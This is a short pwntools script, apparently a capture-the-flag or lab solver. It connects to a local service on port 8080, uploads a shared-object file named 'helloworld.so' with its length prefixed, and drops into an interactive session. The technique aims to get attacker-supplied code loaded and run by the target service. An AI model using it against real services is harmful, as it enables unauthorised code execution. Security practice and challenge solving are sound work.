from pwn import *

p = remote('localhost', 8080)

f = open('helloworld.so', 'rb').read()
p.sendline(str(len(f)+1).encode())
p.sendline(f)
p.interactive()

